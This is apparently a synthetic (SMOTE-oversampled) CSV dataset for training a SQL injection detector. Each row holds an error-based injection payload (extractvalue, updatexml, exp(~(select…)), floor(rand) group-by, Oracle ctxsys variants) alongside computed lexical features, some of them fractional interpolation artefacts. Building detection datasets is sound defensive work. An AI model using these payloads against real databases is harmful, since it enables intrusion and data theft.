id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu",nearest_attack_euclidean,R000112,0.33156048429492174,225.67355927801407,31.77892654633568,3.4435849332626844,58.44731636583919,32.0,104.33677963900703,30.889463273167838,0.2589447970011816,0.14183887108090462,0.46232404986913467,0.1368922820487791,0.0,4.0,0.0,0.0,1.0,1.1105367268321613,0.0,19.778926546335676,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.1105367268321613,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.8894632731678387,0.11053672683216126,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000012,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000035,0.04400569961925211,213.41645648394194,38.91670870321161,3.8041199430645123,63.0,37.0,89.33316518715355,24.08329129678839,0.2952096145391665,0.17337707520554224,0.41857043454780707,0.11284287570748418,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.08329129678839,2.7755575615628914e-17,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000013,attack,error,"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000108,0.2866555413167442,206.16271900360672,40.162719003606746,3.885535142148138,63.0,37.0,83.0,23.162719003606746,0.3055848389562585,0.17947046097431055,0.4025958989423723,0.11234880112705864,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.16271900360674363,-1.1102230246251565e-16,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000014,attack,error,"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000045,0.1835039606088802,330.07593210496566,38.07593210496568,3.8468148891035665,101.07593210496569,55.0,133.0,41.0,0.3062197972355318,0.16662843297836571,0.40293784702041163,0.1242139227656908,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,-1.1102230246251565e-16,6.0,5.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.075932104965681,0.9240678950343191,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000015,attack,error,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,0.6214751278595092,222.1446615192815,29.25231311991547,3.3271156205722,49.77544431907016,32.630782799788676,106.11690408029585,33.621530320126794,0.22341385996910634,0.14679982829567512,0.47823628912738725,0.15155002260783132,0.0,4.0,0.0,0.0,0.8738434400422654,2.0,0.0,19.74768688008453,2.0,-1.1102230246251565e-16,4.126156559957734,2.8738434400422657,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,2.747686880084531,0.0,0.0,0.8738434400422654,1.8738434400422657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12615655995773456,0.12615655995773456,6.747686880084531
SMOTE_000016,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000018,0.051225239527778695,188.98529941823367,31.014700581766338,3.8951534459323662,48.014700581766334,47.0,66.0,27.970598836467325,0.254066307494051,0.2486966938912253,0.34923365525150785,0.14800334336321574,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,12.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,5.970598836467324,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.9852994182336616,2.0,0.0,1.0,0.0,0.014700581766338372,0.9852994182336619,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000017,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000017,0.8361269932805376,187.40935663378235,29.655806195173952,3.635730201199424,50.40935663378234,33.967418585521855,77.6883876096521,25.344193804826048,0.2687523045841267,0.18143707646788182,0.41457858240384005,0.13523203654415147,4.0,0.0,0.0,0.0,0.344193804826048,2.0,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,4.655806195173952,2.3441938048260473,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.688387609652096,0.0,0.0,0.3441938048260479,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.032581414478144
SMOTE_000018,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000019,1.3733300044149634,220.49414338821106,30.91569056470184,3.432525602470488,56.2892264117546,32.0,101.74707169410551,30.45784528235092,0.25516852649449534,0.14523486141947028,0.4614219899354532,0.13817462215058124,0.0,4.0,0.0,0.0,1.0,1.5421547176490802,0.0,18.91569056470184,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.5421547176490806,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.4578452823509198,0.5421547176490802,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000019,attack,error,"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000116,1.101287722391434,198.77683332812035,31.55548809486574,3.632687333670264,51.332928569194436,40.0,82.33292856919444,25.11097618973148,0.2580334914306311,0.20147941940684935,0.41418004147093934,0.12630704769158024,0.0,0.5554880948657397,2.0,0.0,1.0,2.0,0.0,14.555488094865739,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.0,0.0,0.5554880948657396,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000020,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000091,1.2823091914385056,200.5218058815295,32.30897459322403,3.7386819455016345,59.7243648306008,35.617949186448065,80.25256808480854,24.926923779672094,0.2952973822661917,0.17909629754086037,0.4006378287567418,0.12496849143620614,0.0,4.0,0.0,0.0,1.1102230246251565e-16,1.3089745932240322,0.0,14.617949186448065,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.3089745932240318,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.6910254067759678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.30897459322403203,0.30897459322403203,4.308974593224032
SMOTE_000021,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000094,0.7545466546552885,348.30348850169327,34.0,3.584957130237157,88.7144183972908,55.6427908013546,145.28558160270921,58.66069770033865,0.2547904466079185,0.1597240408768331,0.4170686315751356,0.16841688094011284,0.0,1.0,2.0,0.0,1.1102230246251565e-16,3.0,0.0,29.3213954006773,2.7755575615628914e-17,1.0179068989840503,0.66069770033865,25.0,0.0,1.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000022,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",nearest_attack_euclidean,R000071,0.6637814591970531,323.60875465661616,39.608754656616185,4.027275164014512,112.43501862646472,55.0,119.78249068676763,36.39124534338382,0.3474329014650492,0.16995870593859755,0.3701514082709876,0.11245698432536573,0.0,4.0,0.0,0.0,2.0,1.3912453433838188,0.0,22.0,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.391245343383819,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000023,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000041,0.6908324152553105,194.39563517911256,28.395635179112556,3.5069619717014655,48.58254071645022,35.0,84.2087296417749,26.604364820887444,0.2498920974246115,0.18004633277110918,0.43319758287813276,0.1368639869261466,4.0,0.0,0.0,0.0,1.1102230246251565e-16,1.6043648208874455,0.0,16.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,1.6043648208874455,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
